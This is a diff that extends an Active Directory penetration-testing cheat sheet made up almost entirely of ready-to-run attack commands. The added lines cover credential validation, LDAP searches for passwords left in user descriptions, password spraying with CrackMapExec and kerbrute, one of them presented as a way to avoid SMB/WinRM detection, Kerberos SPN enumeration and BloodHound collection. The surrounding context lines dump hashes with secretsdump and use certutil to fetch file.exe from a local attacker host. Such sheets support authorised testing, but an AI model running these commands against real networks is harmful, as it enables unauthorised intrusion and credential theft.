@@ -93,6 +93,13 @@ netexec smb $targetip -u guest -p '' --users
 # NetExec SMB spider_plus module - crawl & download interesting files
 netexec smb $targetip -u $user -p "$password" -M spider_plus -o DOWNLOAD_FLAG=True
 
+# Validate credentials on DC (fastest check)
+crackmapexec smb $targetip -u $user -p "$password" --local-auth
+
+# Sometimes SMB requires explicit domain (. or WORKGROUP)
+crackmapexec smb $targetip -u $user -p "$password" -d $domain
+crackmapexec smb $targetip -u $user -p "$password" -d WORKGROUP
+crackmapexec smb $targetip -u $user -p "$password" -d .
 
 ######################################################################
 # RPC / SAMR ENUMERATION
@@ -129,6 +136,12 @@ ldapsearch -x -H ldap://$targetip -b "$basedn"
 # NetExec LDAP users enumeration with anonymous or known creds
 netexec ldap $targetip -u "" -p "" --users
 netexec ldap $targetip -u $user -p "$password" --users
+
+# Enumerate AD user descriptions (often contain passwords)
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=user)" sAMAccountName description
+
+# Enumerate groups with description
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=group)" cn description
 
 
 ######################################################################
@@ -213,6 +226,11 @@ impacket-secretsdump -just-dc $domain/$user:"$password"@$targetip
 # (Use from mounted hives or live system with proper paths)
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 
+# Test credentials using Kerberos TGT (very reliable)
+impacket-getTGT $domain/$user:$password
+
+# Simple SMB authentication test
+impacket-smbclient $domain/$user:$password@$targetip
 
 ######################################################################
 # NETEXEC / CRACKMAPEXEC - HASH DUMPING WORKFLOW
@@ -251,6 +269,15 @@ netexec ldap $targetip users.txt -H unique_hashes.txt --continue-on-success
 # Password/hash spray over WMI
 netexec wmi $targetip users.txt -H unique_hashes.txt --continue-on-success
 
+# Simple password spray with CrackMapExec
+crackmapexec smb $targetip -u users.txt -p 'Password1!'
+
+# Safe password spray (avoids lockouts)
+crackmapexec smb $targetip -u users.txt -p passwords.txt --no-bruteforce
+
+# Kerberos password spray (avoids SMB/WinRM detection)
+kerbrute passwordspray -d $domain --dc $targetip users.txt 'Password1!'
+
 
 ######################################################################
 # GETTING SHELLS USING HASHES
@@ -278,6 +305,9 @@ kerbrute userenum users.txt --dc $targetip -d $domain
 
 # Decrypt GPP cpassword value - gpp-decrypt
 gpp-decrypt <cpassword_value>
+
+# Enumerate only SPN users without requesting tickets (safe)
+impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip
 
 
 ######################################################################
@@ -406,6 +436,8 @@ Sharphound.exe -c All -d $domain -zipfilename loot_bloodhound.zip
 # - Import into BloodHound GUI
 # - Analyze attack paths (Shortest Path to DA, etc.)
 
+# BloodHound collection from Linux (no Windows shell needed)
+bloodhound-python -d $domain -u $user -p "$password" -ns $targetip -c All
 
 ######################################################################
 # PIVOTING & PORT FORWARDING - CHISEL / SSH / SOCAT
@@ -526,5 +558,6 @@ certutil -urlcache -split -f http://$localip/file.exe file.exe
 ######################################################################
 
 ######################################################################
+
 
 
